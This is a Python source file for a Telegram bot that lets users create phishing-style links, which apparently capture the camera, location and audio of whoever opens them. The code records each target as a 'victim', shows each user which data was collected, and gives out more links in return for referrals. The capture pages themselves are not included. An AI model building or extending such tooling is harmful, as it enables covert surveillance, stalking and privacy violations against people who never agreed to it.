import telebot, random, string, time, traceback, sys
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL
from database import db, REQUIRED_REFS, FREE_LINKS

sys.stdout.reconfigure(line_buffering=True)

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def gen_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def check_ch(uid):
    try:
        m = bot.get_chat_member(CHANNEL_USERNAME, uid)
        return m.status in ('member','administrator','creator')
    except: return False

def mk_kb():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("📷 New Link", callback_data="a"),
        telebot.types.InlineKeyboardButton("📋 My Links", callback_data="b"),
        telebot.types.InlineKeyboardButton("👤 Profile", callback_data="c"),
        telebot.types.InlineKeyboardButton("🔗 Referral", callback_data="d"),
        telebot.types.InlineKeyboardButton("📊 Stats", callback_data="e"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def bk():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    un = m.from_user.username or 'User'
    fn = m.from_user.first_name or ''
    user = db.get_user(uid)
    new = False
    if not user:
        db.create_user(uid, un, fn)
        new = True
    
    args = m.text.split()
    if len(args) > 1 and new:
        try:
            rid = int(args[1])
            print(f"Referral attempt: {rid} -> {uid}", flush=True)
            if rid != uid:
                u = db.get_user(uid)
                if u and not u.get('referred_by'):
                    result = db.add_referral(rid, uid)
                    print(f"Referral result: {result}", flush=True)
                    if result:
                        try:
                            referrer = db.get_user(rid)
                            if referrer:
                                bot.send_message(rid, f"🎉 New referral!\n👤 {fn} joined via your link!\n📊 Total: {referrer['refer_count']}")
                        except: pass
        except Exception as e:
            print(f"Referral error: {e}", flush=True)
    
    if new:
        txt = f"🎉 *Welcome {fn}!*\n\n✅ You got *{FREE_LINKS} free links*!\n👥 Every *{REQUIRED_REFS} referrals* = +1 link\n📢 Join our channel to start!"
    else:
        txt = f"👋 *Welcome back {fn}!*"
    
    try:
        bot.send_message(uid, txt, parse_mode='Markdown', reply_markup=mk_kb())
    except:
        try:
            bot.send_message(uid, txt, reply_markup=mk_kb())
        except: pass

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = c.from_user.id
    d = c.data
    
    try:
        bot.answer_callback_query(c.id)
    except:
        pass
    
    try:
        if not c.message:
            return
        
        mid = c.message.message_id
        
        if d == 'm':
            try:
                bot.edit_message_text("📌 *Main Menu*\n\nSelect an option below:", uid, mid, parse_mode='Markdown', reply_markup=mk_kb())
            except:
                try:
                    bot.edit_message_text("Main Menu", uid, mid, reply_markup=mk_kb())
                except: pass
        
        elif d == 'a':
            try:
                if not check_ch(uid):
                    bot.edit_message_text(f"❌ *Please join our channel first!*\n👉 {CHANNEL_USERNAME}", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                if db.is_rate_limited(uid):
                    bot.edit_message_text("⚠️ *Rate Limit!*\n\nMaximum 5 links per hour.", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                av = db.get_available_links(uid)
                print(f"User {uid} available links: {av}", flush=True)
                if av <= 0:
                    u = db.get_user(uid)
                    rc = u.get('refer_count',0) if u else 0
                    need = REQUIRED_REFS - (rc % REQUIRED_REFS)
                    if need == REQUIRED_REFS: need = 0
                    if need < 1: need = 1
                    bot.edit_message_text(f"❌ *No links left!*\n\n👥 You need {need} more referral(s) to get +1 link.\n🔗 Share your referral link to earn more!", uid, mid, parse_mode='Markdown', reply_markup=mk_kb())
                    return
                code = gen_code()
                cu = f'{BASE_URL}/camera/{code}'
                lu = f'{BASE_URL}/location/{code}'
                au = f'{BASE_URL}/audio/{code}'
                if not db.create_victim(uid, code, cu, lu, au):
                    bot.edit_message_text("❌ *Failed to create link!*", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                txt = f"✅ *New Link Created!*\n\n🔑 Code: `{code}`\n📦 Available: {av-1}\n\n📷 Camera:\n`{cu}`\n\n📍 Location:\n`{lu}`\n\n🎤 Audio:\n`{au}`"
                nk = telebot.types.InlineKeyboardMarkup()
                nk.add(telebot.types.InlineKeyboardButton("📋 My Links", callback_data="b"))
                nk.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=nk)
            except Exception as e:
                print(f"New Link error: {e}", flush=True)
        
        elif d == 'b':
            try:
                pp = 5
                vs = db.get_user_victims(uid, pp, 0)
                if not vs or len(vs) == 0:
                    bot.edit_message_text("📋 *No links yet!*\n\nClick '📷 New Link' to create one.", uid, mid, parse_mode='Markdown', reply_markup=mk_kb())
                    return
                total_count = len(db.get_user_victims(uid, 9999, 0))
                tp = max(1, (total_count + pp - 1) // pp)
                txt = f"📋 *Your Links (1/{tp})*\n\n"
                for v in vs:
                    if not v: continue
                    ic = []
                    if v.get('camera_data'): ic.append('📷')
                    if v.get('location_data'): ic.append('📍')
                    if v.get('audio_data'): ic.append('🎤')
                    st = ' '.join(ic) if ic else '⏳'
                    txt += f"`{v.get('victim_code','?')}` {st} 👁{v.get('access_count',0)}\n   📅 {str(v.get('created_at','?'))[:16]}\n\n"
                nk = telebot.types.InlineKeyboardMarkup()
                if tp > 1:
                    nk.add(telebot.types.InlineKeyboardButton("Next ▶️", callback_data="p1"))
                nk.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=nk)
            except Exception as e:
                print(f"My Links error: {e}", flush=True)
        
        elif d == 'c':
            try:
                u = db.get_user(uid)
                if not u:
                    bot.edit_message_text("❌ *User not found!*\nUse /start first.", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                ch = '✅' if check_ch(uid) else '❌'
                av = db.get_available_links(uid)
                vs = db.get_user_victims(uid, 9999, 0)
                dc = sum(1 for v in vs if v and (v.get('camera_data') or v.get('location_data') or v.get('audio_data')))
                txt = f"👤 *Profile*\n\n🆔 ID: `{uid}`\n👤 Name: {u.get('first_name') or u.get('username','?')}\n📅 Joined: {str(u.get('join_date','?'))[:10]}\n📢 Channel: {ch}\n👥 Referrals: {u.get('refer_count',0)}\n🔗 Total Links: {u.get('total_links_created',0)}\n📦 Available: {av}\n✅ Data Collected: {dc}"
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=bk())
            except Exception as e:
                print(f"Profile error: {e}", flush=True)
        
        elif d == 'd':
            try:
                bu = bot.get_me().username
                link = f'https://t.me/{bu}?start={uid}'
                u = db.get_user(uid)
                rc = u.get('refer_count',0) if u else 0
                extra = rc // REQUIRED_REFS
                need = REQUIRED_REFS - (rc % REQUIRED_REFS)
                if need == REQUIRED_REFS: need = 0
                txt = f"🔗 *Referral*\n\n📎 Share your link:\n`{link}`\n\n👥 Referrals: {rc}\n🎁 Extra Links: {extra}\n🆓 Free: {FREE_LINKS}\n⏳ Next in: {need} referral(s)"
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=bk())
            except Exception as e:
                print(f"Referral error: {e}", flush=True)
        
        elif d == 'e':
            try:
                s = db.get_stats()
                txt = f"📊 *Stats*\n\n👥 Total Users: {s['users']}\n🎯 Total Victims: {s['victims']}\n📷 Camera Data: {s['camera']}\n📍 Location Data: {s['location']}\n🎤 Audio Data: {s['audio']}"
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=bk())
            except Exception as e:
                print(f"Stats error: {e}", flush=True)
        
        elif d.startswith('p'):
            try:
                page = int(d[1:])
                pp = 5
                off = page * pp
                vs = db.get_user_victims(uid, pp, off)
                total_count = len(db.get_user_victims(uid, 9999, 0))
                tp = max(1, (total_count + pp - 1) // pp)
                if not vs:
                    vs = db.get_user_victims(uid, pp, 0)
                    page = 0
                txt = f"📋 *Your Links ({page+1}/{tp})*\n\n"
                for v in vs:
                    if not v: continue
                    ic = []
                    if v.get('camera_data'): ic.append('📷')
                    if v.get('location_data'): ic.append('📍')
                    if v.get('audio_data'): ic.append('🎤')
                    st = ' '.join(ic) if ic else '⏳'
                    txt += f"`{v.get('victim_code','?')}` {st} 👁{v.get('access_count',0)}\n   📅 {str(v.get('created_at','?'))[:16]}\n\n"
                nk = telebot.types.InlineKeyboardMarkup()
                nav_btns = []
                if page > 0:
                    nav_btns.append(telebot.types.InlineKeyboardButton("◀️ Prev", callback_data=f'p{page-1}'))
                if page < tp - 1:
                    nav_btns.append(telebot.types.InlineKeyboardButton("Next ▶️", callback_data=f'p{page+1}'))
                if nav_btns:
                    nk.row(*nav_btns)
                nk.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=nk)
            except Exception as e:
                print(f"Pagination error: {e}", flush=True)
        
    except Exception as e:
        print(f"Callback error: {e}", flush=True)
        traceback.print_exc()

def run():
    print('✅ Bot polling started...', flush=True)
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f'⚠️ Polling error: {e}', flush=True)
            time.sleep(3)
